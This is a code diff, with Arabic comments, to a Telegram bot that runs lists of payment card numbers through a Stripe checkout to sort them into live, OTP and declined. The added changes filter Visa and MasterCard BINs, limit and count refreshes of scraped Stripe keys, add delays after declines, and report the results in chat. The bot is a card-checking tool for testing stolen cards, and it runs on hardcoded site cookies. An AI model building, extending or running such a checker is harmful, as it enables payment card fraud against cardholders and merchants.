@@ -31,6 +31,12 @@ def luhn_check(card_number):
     checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
     return checksum % 10 == 0
 
+# فحص BIN بسيط (للتأكد إن الكارت Visa أو MasterCard)
+def is_valid_bin(card_number):
+    bin = card_number[:6]
+    # أمثلة لـ BIN مدعوم (Visa يبدأ بـ 4، MasterCard بـ 5)
+    return bin.startswith(('4', '5'))
+
 # رأس الطلبات للموقع
 cookies = {
     '_gcl_au': '1.1.1927848327.1760870107',
@@ -118,6 +124,14 @@ class StripeChecker:
             return {
                 'status': 'ERROR',
                 'message': 'Invalid card number (Luhn check failed)',
+                'details': {},
+                'time': round(time.time() - start_time, 2)
+            }
+
+        if not is_valid_bin(card['number']):
+            return {
+                'status': 'DECLINED',
+                'message': '❌ Unsupported card type (BIN not Visa/MasterCard)',
                 'details': {},
                 'time': round(time.time() - start_time, 2)
             }
@@ -391,10 +405,11 @@ def check_cards_thread(user_id, message):
         checking_status[user_id] = False
         return
     
-    live = otp = declined = errors = checked = 0
+    live = otp = declined = errors = checked = refresh_count = 0
     start_time = time.time()
     card_count = 0  # عداد الكروت للتجديد كل 10
-    error_count = 0  # عداد الأخطاء للتجديد بعد خطأ واحد
+    error_count = 0  # عداد الأخطاء للتجديد بعد 3 أخطاء متتالية
+    max_refreshes = 5  # الحد الأقصى للتجديدات
     
     for card in cards:
         if not checking_status.get(user_id, True):
@@ -404,12 +419,25 @@ def check_cards_thread(user_id, message):
         card_count += 1
         result = checker.check_card(card)
         
-        # تجديد المفاتيح كل 10 كروت أو بعد خطأ واحد
-        if card_count >= 10 or (result['status'] in ['ERROR', 'DECLINED'] and error_count >= 1):
-            bot.send_message(user_id, "⚠️ Refreshing keys...")
+        # تجديد المفاتيح كل 10 كروت أو بعد 3 أخطاء متتالية
+        if card_count >= 10 or (result['status'] in ['ERROR', 'DECLINED'] and error_count >= 3):
+            if refresh_count >= max_refreshes:
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=message.message_id,
+                    text=f"""<b>⚠️ Max key refresh limit reached!
+━━━━━━━━━━━━━━━━━━━━
+⏳ Checking stopped. Please update cookies.
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+                )
+                checking_status[user_id] = False
+                return
             if checker.fetch_stripe_keys():
                 card_count = 0
                 error_count = 0
+                refresh_count += 1
             else:
                 bot.edit_message_text(
                     chat_id=message.chat.id,
@@ -437,6 +465,7 @@ def check_cards_thread(user_id, message):
             types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Refreshes 🔄 ➜ [{refresh_count}] •", callback_data='x'),
             types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
         )
         
@@ -460,9 +489,11 @@ def check_cards_thread(user_id, message):
         elif result['status'] == 'DECLINED':
             declined += 1
             error_count += 1
+            time.sleep(3)  # تأخير إضافي بعد DECLINED
         else:
             errors += 1
             error_count += 1
+            time.sleep(3)  # تأخير إضافي بعد ERROR
         
         # تخزين نتيجة الكرت
         user_cards[user_id][checked-1]['result'] = result
@@ -483,6 +514,7 @@ def check_cards_thread(user_id, message):
 {progress_bar}
 ⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
 💳 Current: {card['number'][:6]}...{card['number'][-4:]}
+🔄 Key Refreshes: {refresh_count}
 </b>""",
                 reply_markup=keyboard
             )
@@ -504,6 +536,7 @@ def check_cards_thread(user_id, message):
 ├ OTP 🔐: {otp}
 ├ Declined ❌: {declined}
 ├ Errors ⚠️: {errors}
+├ Key Refreshes 🔄: {refresh_count}
 
 ⏱ Stats:
 ├ Time: {int(total_time)}s
